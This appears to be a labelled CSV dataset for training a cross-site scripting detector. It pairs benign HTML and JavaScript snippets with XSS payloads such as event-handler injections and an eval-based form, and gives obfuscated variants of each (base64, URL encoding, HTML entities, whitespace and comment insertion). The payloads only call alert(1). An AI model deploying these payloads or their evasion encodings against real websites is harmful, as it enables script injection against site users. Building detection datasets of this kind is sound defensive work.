payload_original,payload_obfuscated,label,technique
"<li id=""cite_note-footnoterussellnorvig200916-30""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-footnoterussellnorvig200916_30-0"">^ </a> </b>","<li id=""cite_note-footnoterussellnorvig200916-30""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-footnoterussellnorvig200916_30-0"">^ </a> </b>",0,none
"scale: [0.4, 1], translatey: [this.offsety, 0], translatex: [this.offsetx, 0],","scale: [0.4, 1], translatey: [this.offsety, 0], translatex: [this.offsetx, 0],",0,none
"<h4><span class=""mw-headline"" id=""logic-based"">logic-based","<h4><span class=""mw-headline"" id=""logic-based"">logic-based",0,none
"<style>@keyframes x{}</style><svg style=""animation-name:x"" onanimationstart=""alert(1)""></svg>","<style>@keyframes x{}</style><svg style=""animation-name:x"" onanimationstart=""alert(1)""></svg>",1,whitespace_noise
"<area oncopy=""alert(1)"" contenteditable>test</area>",PGFyZWEgb25jb3B5PSJhbGVydCgxKSIgY29udGVudGVkaXRhYmxlPnRlc3Q8L2FyZWE+,1,base64
const event_hide = `hide${event_key}` const event_hidden = `hidden${event_key}` const event_show = `show${event_key}`,const event_hide = `hide${event_key}` const event_hidden = `hidden${event_key}` const event_show = `show${event_key}`,0,none
"<button onbeforecopy=""alert(1)"" contenteditable>test</button>","<button onbeforecopy= ""alert(1)""  contenteditable>test</button>",1,whitespace_noise
previous = previous.previouselementsibling } return [],previous = previous.previouselementsibling } return [],0,none
"} form.classlist.add('was-validated') }, false)","} form.classlist.add('was-validated') }, false)",0,none
"<style>:target {color: red;}</style><th id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></th>","<style>:target {color: red;}</style><th id=x style=""transition:color 10s"" ontrans/*OBF*/itioncancel=alert(1)></th>",1,comment_marker
"<optgroup onbeforepaste=""alert(1)"" contenteditable>test</optgroup>","<optgroup onbeforepaste=""alert(1)"" contenteditable>test<  /  optgroup>",1,whitespace_noise
var ownelement = getwindow(node).element,var ownelement = getwindow(node).element,0,none
<object onpointerout=alert(1)>xss</object>,PG9iamVjdCBvbnBvaW50ZXJvdXQ9YWxlcnQoMSk+eHNzPC9vYmplY3Q+,1,base64
this._handlerangemouseuptouchendbound = this._handlerangemouseuptouchend.bind(this),this._handlerangemouseuptouchendbound = this._handlerangemouseuptouchend.bind(this),0,none
<x @[_b.constructor`alert(1)`()]>,PHggQFtfYi5jb25zdHJ1Y3RvcmBhbGVydCgxKWAoKV0+,1,base64
return order === order_prev ? direction_right : direction_left; } static jqueryinterface(config) {,return order === order_prev ? direction_right : direction_left; } static jqueryinterface(config) {,0,none
"<li><a href=""/wiki/list_of_artificial_intelligence_projects"" title=""list of artificial intelligence projects"">projects </a> </li>","<li><a href=""/wiki/list_of_artificial_intelligence_projects"" title=""list of artificial intelligence projects"">projects </a> </li>",0,none
"<a href=""/wiki/applied_information_economics"" title=""applied information economics"">information value theory </a>:","<a href=""/wiki/applied_information_economics"" title=""applied information economics"">information value theory </a>:",0,none
"<li><cite id=""citerefacm1998"" class=""citation web""><a rel=""nofollow"" class=""external text"" href=""https://web.archive.org/web/20071012025921/http://www.acm.org/class/1998/i.2.html"">""acm computing classification system: artificial intelligence"" </a>. <a href=""/wiki/association_for_computing_machinery"" title=""association for computing machinery"">acm </a>. 1998. archived from <a rel=""nofollow"" class=""external text"" href=""http://www.acm.org/class/1998/i.2.html"">the original </a> on 12 october 2007<span class=""reference-accessdate"">. retrieved <span class=""nowrap"">30 august","<li><cite id=""citerefacm1998"" class=""citation web""><a rel=""nofollow"" class=""external text"" href=""https://web.archive.org/web/20071012025921/http://www.acm.org/class/1998/i.2.html"">""acm computing classification system: artificial intelligence"" </a>. <a href=""/wiki/association_for_computing_machinery"" title=""association for computing machinery"">acm </a>. 1998. archived from <a rel=""nofollow"" class=""external text"" href=""http://www.acm.org/class/1998/i.2.html"">the original </a> on 12 october 2007<span class=""reference-accessdate"">. retrieved <span class=""nowrap"">30 august",0,none
"<li><cite id=""citerefdowehajek1997"" class=""citation journal"">dowe, d. l.; hajek, a. r. (1997). <a rel=""nofollow"" class=""external text"" href=""https://web.archive.org/web/20110628194905/http://www.csse.monash.edu.au/publications/1997/tr-cs97-322-abs.html"">""a computational extension to the turing test"" </a>. <i>proceedings of the 4th conference of the australasian cognitive science society </i>. archived from <a rel=""nofollow"" class=""external text"" href=""http://www.csse.monash.edu.au/publications/1997/tr-cs97-322-abs.html"">the original </a> on 28 june 2011. </cite><span title=""ctx_ver=z39.88-2004&amp;rft_val_fmt=info%3aofi%2ffmt%3akev%3amtx%3ajournal&amp;rft.genre=article&amp;rft.jtitle=proceedings+of+the+4th+conference+of+the+australasian+cognitive+science+society&amp;rft.atitle=a+computational+extension+to+the+turing+test&amp;rft.date=1997&amp;rft.aulast=dowe&amp;rft.aufirst=d.+l.&amp;rft.au=hajek%2c+a.+r.&amp;rft_id=http%3a%2f%2fwww.csse.monash.edu.au%2fpublications%2f1997%2ftr-cs97-322-abs.html&amp;rfr_id=info%3asid%2fen.wikipedia.org%3aartificial+intelligence"" class=""z3988"">","<li><cite id=""citerefdowehajek1997"" class=""citation journal"">dowe, d. l.; hajek, a. r. (1997). <a rel=""nofollow"" class=""external text"" href=""https://web.archive.org/web/20110628194905/http://www.csse.monash.edu.au/publications/1997/tr-cs97-322-abs.html"">""a computational extension to the turing test"" </a>. <i>proceedings of the 4th conference of the australasian cognitive science society </i>. archived from <a rel=""nofollow"" class=""external text"" href=""http://www.csse.monash.edu.au/publications/1997/tr-cs97-322-abs.html"">the original </a> on 28 june 2011. </cite><span title=""ctx_ver=z39.88-2004&amp;rft_val_fmt=info%3aofi%2ffmt%3akev%3amtx%3ajournal&amp;rft.genre=article&amp;rft.jtitle=proceedings+of+the+4th+conference+of+the+australasian+cognitive+science+society&amp;rft.atitle=a+computational+extension+to+the+turing+test&amp;rft.date=1997&amp;rft.aulast=dowe&amp;rft.aufirst=d.+l.&amp;rft.au=hajek%2c+a.+r.&amp;rft_id=http%3a%2f%2fwww.csse.monash.edu.au%2fpublications%2f1997%2ftr-cs97-322-abs.html&amp;rfr_id=info%3asid%2fen.wikipedia.org%3aartificial+intelligence"" class=""z3988"">",0,none
"<area onmouseover=""alert(1)"">test</area>",&lt;area onmouseover=&quot;alert(1)&quot;&gt;test&lt;/area&gt;,1,html_entities
"return eventend(event, data)","return eventend(event, data)",0,none
"1 ), visibledate = date.gettime();","1 ), visibledate = date.gettime();",0,none
} _getoffset() { const { offset } = this._config,} _getoffset() { const { offset } = this._config,0,none
"<form action=""http://subdomain1.portswigger-labs.net/xss/xss.php"" target=""alert(1)""><input type=hidden name=x value=""';eval(name)//""><input type=hidden name=context value=js_string_single><input type=""submit"" value=""xss via target in a form""></form>",PGZvcm0gYWN0aW9uPSJodHRwOi8vc3ViZG9tYWluMS5wb3J0c3dpZ2dlci1sYWJzLm5ldC94c3MveHNzLnBocCIgdGFyZ2V0PSJhbGVydCgxKSI+PGlucHV0IHR5cGU9aGlkZGVuIG5hbWU9eCB2YWx1ZT0iJztldmFsKG5hbWUpLy8iPjxpbnB1dCB0eXBlPWhpZGRlbiBuYW1lPWNvbnRleHQgdmFsdWU9anNfc3RyaW5nX3NpbmdsZT48aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0ieHNzIHZpYSB0YXJnZXQgaW4gYSBmb3JtIj48L2Zvcm0+,1,base64
"<sup onbeforecopy=""alert(1)"" contenteditable>test</sup>","<sup onbeforecopy=""alert(1)"" contenteditable>test</sup>",1,comment_marker
} _animatein() { this._positiontooltip();,} _animatein() { this._positiontooltip();,0,none
}; }()); var getprefixedprop = (function () {,}; }()); var getprefixedprop = (function () {,0,none
"<thead onkeypress=""alert(1)"" contenteditable>test</thead>","<thead onkeypress=""  alert(1)  ""   contenteditable>test<  /thead>",1,whitespace_noise
"<li><a href=""/wiki/idealism"" title=""idealism"">idealism </a> </li>","<li><a href=""/wiki/idealism"" title=""idealism"">idealism </a> </li>",0,none
"<div onbeforecut=""alert(1)"" contenteditable>test</div>","<div onbeforecut=""alert(1)"" contenteditable>test</div>",1,whitespace_noise
<marquee onpointerup=alert(1)>xss</marquee>,<marquee o/*OBF*/npointeru/*OBF*/p=alert(1)>xss</marquee>,1,comment_marker
<shadow onpointerover=alert(1)>xss</shadow>,PHNoYWRvdyBvbnBvaW50ZXJvdmVyPWFsZXJ0KDEpPnhzczwvc2hhZG93Pg==,1,base64
"} // eslint-disable-next-line import/no-unused-modules const popperoffsets$1 = { name: 'popperoffsets',","} // eslint-disable-next-line import/no-unused-modules const popperoffsets$1 = { name: 'popperoffsets',",0,none
"<em ondblclick=""alert(1)"">test</em>","<em ondblclick=""alert(1) "">test</em>",1,whitespace_noise
"<dt><a class=""reference internal"" href=""topics/leaks.html""><span class=""doc"">debugging memory leaks","<dt><a class=""reference internal"" href=""topics/leaks.html""><span class=""doc"">debugging memory leaks",0,none
let indicator = document.createelement('li'),let indicator = document.createelement('li'),0,none
<tbody onpointermove=alert(1)>xss</tbody>,<tbody onpointermove=alert(1)>xss</tbody>,1,whitespace_noise
"key: ""render"", value: function render(year, month, randid) { var opts = this.options,","key: ""render"", value: function render(year, month, randid) { var opts = this.options,",0,none
"value: function rendertable(opts, data, randid) {","value: function rendertable(opts, data, randid) {",0,none
"<b onclick=""alert(1)"">test</b>",PGIgb25jbGljaz0iYWxlcnQoMSkiPnRlc3Q8L2I+,1,base64
<spacer onpointerup=alert(1)>xss</spacer>,< spacer onpointerup=alert(1)>  xss< /spacer>,1,whitespace_noise
"<li><a href=""/wiki/artificial_general_intelligence"" title=""artificial general intelligence"">rtificial general intelligence </a> </li> </ul> </td>","<li><a href=""/wiki/artificial_general_intelligence"" title=""artificial general intelligence"">rtificial general intelligence </a> </li> </ul> </td>",0,none
let $closesttrigger = $(toel).closest('.dropdown-trigger'),let $closesttrigger = $(toel).closest('.dropdown-trigger'),0,none
"'taptarget.js', 'select.js', 'range.js'","'taptarget.js', 'select.js', 'range.js'",0,none
"<nextid onkeyup=""alert(1)"" contenteditable>test</nextid>",PG5leHRpZCBvbmtleXVwPSJhbGVydCgxKSIgY29udGVudGVkaXRhYmxlPnRlc3Q8L25leHRpZD4=,1,base64
"return eventhandler.trigger(this._element, eventname, { relatedtarget: nextelement, direction: this._ordertodirection(order),","return eventhandler.trigger(this._element, eventname, { relatedtarget: nextelement, direction: this._ordertodirection(order),",0,none
"} this._element.focus() this._element.setattribute('aria-expanded', true)","} this._element.focus() this._element.setattribute('aria-expanded', true)",0,none
value: function _renderchip(chip) { if (!chip.tag) { return;,value: function _renderchip(chip) { if (!chip.tag) { return;,0,none
"<li><a href=""/wiki/ingenuity"" title=""ingenuity"">ingenuity </a> </li>","<li><a href=""/wiki/ingenuity"" title=""ingenuity"">ingenuity </a> </li>",0,none
"node.addeventlistener(eventname, callback); } function removeevent(node, eventname, callback) {","node.addeventlistener(eventname, callback); } function removeevent(node, eventname, callback) {",0,none
"_handlecarouseldrag(e) { let x, y, delta, deltay; if (this.pressed) {","_handlecarouseldrag(e) { let x, y, delta, deltay; if (this.pressed) {",0,none
<svg><animatetransform onend=alert(1) attributename=transform dur=1s>,%3Csvg%3E%3Canimatetransform%20onend%3Dalert%281%29%20attributename%3Dtransform%20dur%3D1s%3E,1,urlencode
$textarea = $($textarea); } if (!$textarea.length) {,$textarea = $($textarea); } if (!$textarea.length) {,0,none
"key: ""_removeeventhandlers"", value: function _removeeventhandlers() { this.el.removeeventlistener('click', this._handleinputclickbound);","key: ""_removeeventhandlers"", value: function _removeeventhandlers() { this.el.removeeventlistener('click', this._handleinputclickbound);",0,none
